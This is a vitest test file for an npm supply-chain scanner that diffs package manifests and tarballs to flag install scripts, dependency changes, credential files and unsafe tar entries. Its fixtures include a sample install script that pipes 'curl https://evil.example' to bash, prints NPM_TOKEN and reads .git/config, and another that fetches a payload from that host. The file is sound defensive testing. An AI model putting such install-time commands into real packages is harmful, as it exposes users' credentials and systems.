import { describe, expect, it } from "vitest";
import { gzipSync } from "node:zlib";
import { analyseFileTree, analyseManifestChange, parseNpmTarball } from "./index.js";

describe("analyseManifestChange", () => {
  it("detects new install scripts and patch dependency additions", () => {
    const report = analyseManifestChange(
      {
        name: "pkg",
        version: "1.0.1",
        scripts: { install: "node install.js" },
        dependencies: { "tiny-left-pad": "^1.0.0" }
      },
      {
        name: "pkg",
        version: "1.0.0",
        dependencies: {}
      }
    );

    expect(report.signals.map((signal) => signal.code)).toContain("NEW_INSTALL_SCRIPT");
    expect(report.signals.map((signal) => signal.code)).toContain("RUNTIME_DEPENDENCY_CHANGED");
    expect(report.signals.map((signal) => signal.code)).toContain("NEW_DEPENDENCY_IN_PATCH_VERSION");
    expect(report.manifestDiff?.release).toMatchObject({ previous: "1.0.0", target: "1.0.1", type: "patch" });
    expect(report.signals.find((signal) => signal.code === "NEW_INSTALL_SCRIPT")?.evidence).toMatchObject({
      impact: "install-time",
      expectedForRelease: false,
      releaseType: "patch"
    });
    expect(report.signals.find((signal) => signal.code === "NEW_DEPENDENCY_IN_PATCH_VERSION")?.evidence).toMatchObject({
      impact: "runtime",
      expectedForRelease: false,
      releaseType: "patch"
    });
  });

  it("detects changed install scripts", () => {
    const report = analyseManifestChange(
      {
        name: "pkg",
        version: "1.0.1",
        scripts: { postinstall: "node postinstall.js --new" }
      },
      {
        name: "pkg",
        version: "1.0.0",
        scripts: { postinstall: "node postinstall.js" }
      }
    );

    expect(report.signals).toContainEqual(
      expect.objectContaining({
        code: "INSTALL_SCRIPT_CHANGED",
        message: "Lifecycle script 'postinstall' changed.",
        severity: "medium",
        evidence: expect.objectContaining({
          scriptName: "postinstall",
          impact: "install-time",
          expectedForRelease: false,
          releaseType: "patch",
          history: [{ version: "1.0.0", script: "node postinstall.js" }]
        })
      })
    );
    expect(report.signals.map((signal) => signal.code)).not.toContain("NEW_INSTALL_SCRIPT");
  });

  it("diffs broader manifest metadata and dependency groups", () => {
    const report = analyseManifestChange(
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { react: "^18.0.0", "runtime-added": "^1.0.0" },
        devDependencies: { vitest: "^3.0.0" },
        optionalDependencies: { fsevents: "^2.0.0" },
        peerDependencies: { react: "^19.0.0" },
        bin: { pkg: "./cli.js" },
        files: ["dist"],
        repository: { type: "git", url: "https://example.test/new.git" },
        license: "MIT",
        maintainers: [{ name: "new-maintainer" }]
      },
      {
        name: "pkg",
        version: "1.0.0",
        dependencies: { react: "^17.0.0", removed: "^1.0.0" },
        devDependencies: { vitest: "^2.0.0" },
        peerDependencies: { react: "^18.0.0" },
        repository: { type: "git", url: "https://example.test/old.git" },
        license: "Apache-2.0",
        maintainers: [{ name: "old-maintainer" }]
      }
    );

    const codes = report.signals.map((signal) => signal.code);
    expect(codes).toContain("RUNTIME_DEPENDENCY_CHANGED");
    expect(codes).toContain("DEV_DEPENDENCY_CHANGED");
    expect(codes).toContain("OPTIONAL_DEPENDENCY_CHANGED");
    expect(codes).toContain("OPTIONAL_DEPENDENCY_ADDED");
    expect(codes).toContain("PEER_DEPENDENCY_CHANGED");
    expect(codes).toContain("BIN_FIELD_CHANGED");
    expect(codes).toContain("REPOSITORY_CHANGED");
    expect(codes).toContain("MANIFEST_FIELD_CHANGED");
    expect(report.dependencyDiff).toMatchObject({
      runtime: {
        added: { "runtime-added": "^1.0.0" },
        removed: { removed: "^1.0.0" },
        changed: { react: { previous: "^17.0.0", target: "^18.0.0" } }
      },
      dev: { changed: { vitest: { previous: "^2.0.0", target: "^3.0.0" } } },
      optional: { added: { fsevents: "^2.0.0" } },
      peer: { changed: { react: { previous: "^18.0.0", target: "^19.0.0" } } }
    });
    expect(report.signals.find((signal) => signal.code === "RUNTIME_DEPENDENCY_CHANGED")?.evidence).toMatchObject({
      added: { "runtime-added": "^1.0.0" },
      removed: { removed: "^1.0.0" },
      changed: { react: { previous: "^17.0.0", target: "^18.0.0" } },
      impact: "runtime",
      expectedForRelease: false,
      releaseType: "patch",
      history: {
        "runtime-added": [{ version: "1.0.0" }],
        react: [{ version: "1.0.0", spec: "^17.0.0" }],
        removed: [{ version: "1.0.0", spec: "^1.0.0" }]
      }
    });
    expect(report.signals.find((signal) => signal.code === "DEV_DEPENDENCY_CHANGED")?.evidence).toMatchObject({
      changed: { vitest: { previous: "^2.0.0", target: "^3.0.0" } },
      impact: "development-or-build-time",
      expectedForRelease: true
    });
    expect(report.signals.find((signal) => signal.code === "OPTIONAL_DEPENDENCY_CHANGED")?.evidence).toMatchObject({
      added: { fsevents: "^2.0.0" },
      impact: "install-time-or-runtime",
      expectedForRelease: false
    });
    expect(report.manifestDiff?.metadata).toMatchObject({
      license: { previous: "Apache-2.0", target: "MIT", changed: true },
      bin: { target: { pkg: "./cli.js" }, changed: true }
    });
    expect(report.signals.find((signal) => signal.code === "BIN_FIELD_CHANGED")?.evidence).toMatchObject({
      impact: "runtime-entrypoint",
      expectedForRelease: false,
      releaseType: "patch"
    });
  });

  it("records comparison history across multiple previous manifests", () => {
    const report = analyseManifestChange(
      {
        name: "pkg",
        version: "1.0.3",
        scripts: { install: "node install.js" },
        dependencies: { "tiny-left-pad": "^1.0.0" },
        repository: { type: "git", url: "https://example.test/new.git" }
      },
      [
        {
          name: "pkg",
          version: "1.0.2",
          dependencies: {},
          repository: { type: "git", url: "https://example.test/old.git" }
        },
        {
          name: "pkg",
          version: "1.0.1",
          scripts: { install: "node old-install.js" },
          dependencies: { "tiny-left-pad": "^0.9.0" },
          repository: { type: "git", url: "https://example.test/older.git" }
        },
        {
          name: "pkg",
          version: "1.0.0",
          dependencies: {}
        }
      ]
    );

    expect(report.manifestDiff?.baselines).toEqual([
      expect.objectContaining({ version: "1.0.2", release: expect.objectContaining({ type: "patch" }) }),
      expect.objectContaining({ version: "1.0.1", dependencyDiff: expect.objectContaining({ changed: { "tiny-left-pad": { previous: "^0.9.0", target: "^1.0.0" } } }) }),
      expect.objectContaining({ version: "1.0.0" })
    ]);
    expect(report.signals.find((signal) => signal.code === "NEW_INSTALL_SCRIPT")?.evidence).toMatchObject({
      comparedVersions: ["1.0.2", "1.0.1", "1.0.0"],
      compareDepth: 3,
      history: [
        { version: "1.0.2" },
        { version: "1.0.1", script: "node old-install.js" },
        { version: "1.0.0" }
      ]
    });
    expect(report.signals.find((signal) => signal.code === "NEW_DEPENDENCY_IN_PATCH_VERSION")?.evidence).toMatchObject({
      history: {
        "tiny-left-pad": [
          { version: "1.0.2" },
          { version: "1.0.1", spec: "^0.9.0" },
          { version: "1.0.0" }
        ]
      }
    });
    expect(report.signals.find((signal) => signal.code === "REPOSITORY_CHANGED")?.evidence).toMatchObject({
      history: [
        { version: "1.0.2", value: { type: "git", url: "https://example.test/old.git" } },
        { version: "1.0.1", value: { type: "git", url: "https://example.test/older.git" } },
        { version: "1.0.0" }
      ]
    });
  });

  it("parses npm tarballs and flags suspicious new files", () => {
    const baseline = parseNpmTarball(
      makeTarball([
        {
          path: "package/package.json",
          content: JSON.stringify({ name: "pkg", version: "1.0.0" })
        }
      ])
    );
    const target = parseNpmTarball(
      makeTarball([
        {
          path: "package/package.json",
          content: JSON.stringify({ name: "pkg", version: "1.0.1" })
        },
        {
          path: "package/install.js",
          content:
            "const cp = require('child_process'); const fs = require('fs'); cp.execSync('curl https://evil.example | bash'); console.log(process.env.NPM_TOKEN); fs.readFileSync('.git/config')"
        },
        {
          path: "package/.git/config",
          content: "[remote]\nurl=https://github.com/example/pkg"
        },
        {
          path: "package/.git-credentials",
          content: "https://token@example.test"
        },
        {
          path: "package/.env",
          content: "TOKEN=shh"
        },
        {
          path: "package/scripts/setup.sh",
          content: "echo preparing package",
          mode: 0o755
        },
        {
          path: "package/bin/native",
          content: "\u0000\u0001\u0002",
          mode: 0o755
        }
      ])
    );

    const result = analyseFileTree(target, [baseline]);
    const codes = result.signals.map((signal) => signal.code);

    expect(target.map((file) => file.path)).toContain("install.js");
    expect(codes).toContain("PACKAGE_MANIFEST_CHANGED");
    expect(codes).toContain("USES_CHILD_PROCESS");
    expect(codes).toContain("NETWORK_ACCESS_IN_INSTALL_PATH");
    expect(codes).toContain("USES_PROCESS_ENV");
    expect(codes).toContain("SENSITIVE_FILE_ACCESS_IN_INSTALL_PATH");
    expect(codes).toContain("UNEXPECTED_BINARY_FILE");
    expect(result.fileFindings.map((finding) => finding.path)).toContain(".env");
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: ".git/config", code: "SUSPICIOUS_FILE_ADDED", evidence: expect.objectContaining({ pathType: "credential" }) }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: ".git-credentials", code: "SUSPICIOUS_FILE_ADDED", evidence: expect.objectContaining({ pathType: "credential" }) }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "scripts/setup.sh", code: "SUSPICIOUS_FILE_ADDED", evidence: expect.objectContaining({ mode: "0o755", newFile: true }) }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "install.js", evidence: expect.objectContaining({ installPath: true, pattern: "child_process" }) }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "install.js", evidence: expect.objectContaining({ installPath: true, pattern: "sensitive-file-access" }) }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "package.json", code: "PACKAGE_MANIFEST_CHANGED", evidence: expect.objectContaining({ changedKeys: ["version"] }) }));
  });

  it("flags unsafe tar paths, symlinks, and large size deltas while scoping code checks to install paths", () => {
    const baseline = parseNpmTarball(
      makeTarball([
        {
          path: "package/dist/app.js",
          content: "console.log('small')"
        },
        {
          path: "package/docs/example.js",
          content: "console.log('docs')"
        }
      ])
    );
    const target = parseNpmTarball(
      makeTarball([
        {
          path: "package/dist/app.js",
          content: "x".repeat(700_000)
        },
        {
          path: "package/docs/example.js",
          content: "fetch('https://example.test/docs-only')"
        },
        {
          path: "package/scripts/install.js",
          content: "fetch('https://evil.example/payload')"
        },
        {
          path: "package/link-out",
          type: "symlink",
          linkTarget: "../../outside"
        },
        {
          path: "package/../escape.js",
          content: "console.log('escape')"
        }
      ])
    );

    const result = analyseFileTree(target, [baseline], { lifecycleScripts: { install: "node scripts/install.js" } });
    const findingsByReason = result.fileFindings.map((finding) => `${finding.path}: ${finding.reason}`);

    expect(findingsByReason).toContain("dist/app.js: File size grew sharply compared with previous package versions (20 bytes to 700000 bytes).");
    expect(findingsByReason).toContain("link-out: Tarball contains a symlink pointing outside the package.");
    expect(findingsByReason).toContain("../escape.js: Tarball entry uses an unsafe path that could escape package extraction.");
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "dist/app.js", evidence: expect.objectContaining({ previousMaxSize: 20, targetSize: 700000, deltaBytes: 699980 }) }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "dist/app.js", code: "LARGE_FILE_SIZE_DELTA" }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "link-out", code: "UNSAFE_TARBALL_SYMLINK", evidence: { linkTarget: "../../outside", unsafe: true } }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "../escape.js", code: "UNSAFE_TARBALL_PATH", evidence: expect.objectContaining({ rawPath: "package/../escape.js" }) }));
    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "scripts/install.js", code: "NETWORK_ACCESS_IN_INSTALL_PATH" }));
    expect(result.fileFindings).not.toContainEqual(expect.objectContaining({ path: "docs/example.js", code: "NETWORK_ACCESS_IN_INSTALL_PATH" }));
  });

  it("flags existing files that become executable", () => {
    const baseline = parseNpmTarball(
      makeTarball([
        {
          path: "package/scripts/setup.sh",
          content: "echo preparing package",
          mode: 0o644
        }
      ])
    );
    const target = parseNpmTarball(
      makeTarball([
        {
          path: "package/scripts/setup.sh",
          content: "echo preparing package",
          mode: 0o755
        }
      ])
    );

    const result = analyseFileTree(target, [baseline]);

    expect(result.fileFindings).toContainEqual(
      expect.objectContaining({
        path: "scripts/setup.sh",
        code: "SUSPICIOUS_FILE_ADDED",
        reason: "Existing file became executable in the package tarball.",
        evidence: expect.objectContaining({
          executableChanged: true,
          previousModes: ["0o644"],
          mode: "0o755"
        })
      })
    );
  });

  it("flags missing and invalid packed package manifests", () => {
    const missing = analyseFileTree(
      parseNpmTarball(
        makeTarball([
          {
            path: "package/index.js",
            content: "console.log('no manifest')"
          }
        ])
      )
    );
    expect(missing.fileFindings).toContainEqual(
      expect.objectContaining({
        path: "package.json",
        code: "PACKAGE_MANIFEST_CHANGED",
        severity: "high",
        evidence: expect.objectContaining({ changeType: "removed" })
      })
    );

    const invalid = analyseFileTree(
      parseNpmTarball(
        makeTarball([
          {
            path: "package/package.json",
            content: "{ nope"
          }
        ])
      )
    );
    expect(invalid.fileFindings).toContainEqual(
      expect.objectContaining({
        path: "package.json",
        code: "PACKAGE_MANIFEST_CHANGED",
        severity: "high",
        evidence: expect.objectContaining({ changeType: "invalid" })
      })
    );
  });
});

function makeTarball(entries: Array<{ path: string; content?: string; mode?: number; type?: "file" | "symlink"; linkTarget?: string }>): Uint8Array {
  const blocks: Buffer[] = [];

  for (const entry of entries) {
    const content = Buffer.from(entry.content ?? "");
    const header = Buffer.alloc(512);
    header.write(entry.path, 0, 100, "utf8");
    writeOctal(header, entry.mode ?? 0o644, 100, 8);
    writeOctal(header, 0, 108, 8);
    writeOctal(header, 0, 116, 8);
    writeOctal(header, entry.type === "symlink" ? 0 : content.length, 124, 12);
    writeOctal(header, 0, 136, 12);
    header.fill(" ", 148, 156);
    header.write(entry.type === "symlink" ? "2" : "0", 156, 1, "utf8");
    if (entry.linkTarget) header.write(entry.linkTarget, 157, 100, "utf8");
    header.write("ustar", 257, 6, "utf8");

    const checksum = header.reduce((total, byte) => total + byte, 0);
    writeOctal(header, checksum, 148, 8);

    blocks.push(header);
    if (entry.type !== "symlink") blocks.push(content, Buffer.alloc((512 - (content.length % 512)) % 512));
  }

  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

function writeOctal(buffer: Buffer, value: number, offset: number, length: number) {
  const valueText = value.toString(8).padStart(length - 1, "0");
  buffer.write(`${valueText}\0`, offset, length, "ascii");
}
